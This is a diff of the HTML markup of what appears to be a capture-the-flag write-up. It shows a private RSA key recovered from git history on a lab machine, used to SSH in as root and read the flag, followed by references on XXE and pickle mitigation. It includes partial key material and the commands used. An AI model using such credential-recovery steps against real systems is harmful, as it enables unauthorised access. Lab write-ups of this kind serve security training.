@@ -575,11 +521,8 @@ drwxrwx--- 8 roosa roosa 4096 Oct  1 15:58 .git/
 drwxrwx--- 3 roosa roosa 4096 Mar 19  2018 resources/
 -rwxrw-r-- 1 roosa roosa  180 Mar 21  2018 run-gunicorn.sh*
 drwxrwx--- 2 roosa roosa 4096 Mar 26  2018 src/
-</code></pre></div>
-
-<p>Checking out the commit log with <code>git log</code> there are a couple of interesting
+</code></pre><p>Checking out the commit log with <code>git log</code> there are a couple of interesting
 messages:</p>
-
 <pre><code>...
 commit 33e87c312c08735a02fa9c796021a4a3023129ad
 Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
@@ -592,11 +535,8 @@ Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
 Date:   Mon Mar 19 09:32:03 2018 -0400
 
     add key for feed integration from tnerprise backend
-</code></pre>
-
-<p>It seems as if there was a wrong key committed to the repo, which then got
+</code></pre><p>It seems as if there was a wrong key committed to the repo, which then got
 changed to the current one. Comparing commits shows this theory is correct:</p>
-
 <pre><code>roosa@gitter:~/work/blogfeed/src$ git diff HEAD~~~~~~ HEAD~~~~~
 diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
 index 44c981f..f4bde49 100644
@@ -616,12 +556,9 @@ index 44c981f..f4bde49 100644
 +T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
 +bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
  -----END RSA PRIVATE KEY-----
-</code></pre>
-
-<p>Now we have two RSA keys, which I call &ldquo;existing-key.key&rdquo; and
+</code></pre><p>Now we have two RSA keys, which I call &ldquo;existing-key.key&rdquo; and
 &ldquo;deleted-key.key&rdquo;. Try using them to log in via SSH, and you will find the
 deleted key works for root. You can then get the flag:</p>
-
 <pre><code> $ ssh -i deleted-key.key root@10.10.10.91
 Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
 
@@ -637,16 +574,13 @@ root@gitter:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@gitter:~# cat /root/root.txt
 &lt;root-flag-here&gt;
-</code></pre>
-
-<h1 id="references">References</h1>
-
+</code></pre><h1 id="references">References</h1>
 <ul>
 <li><a href="https://www.acunetix.com/blog/web-security-zone/how-to-mitigate-xxe-vulnerabilities-in-python/">Comparison</a>
 of Python XML parsers with regards to XXE. The gist is to use either <code>minidom</code>
 or <code>etree</code>. However, note the Python docs themselves still list some DOS
 vulnerabilities for those:
-[docs][<a href="https://docs.python.org/2/library/xml.html#xml-vulnerabilities">https://docs.python.org/2/library/xml.html#xml-vulnerabilities</a>]</li>
+[docs][https://docs.python.org/2/library/xml.html#xml-vulnerabilities]</li>
 <li>Regarding pickle on untrusted input, there are
 <a href="https://docs.python.org/3/library/pickle.html#restricting-globals">ways</a> to
 restrict pickle such that certain attacks are prevented. Personally, I would
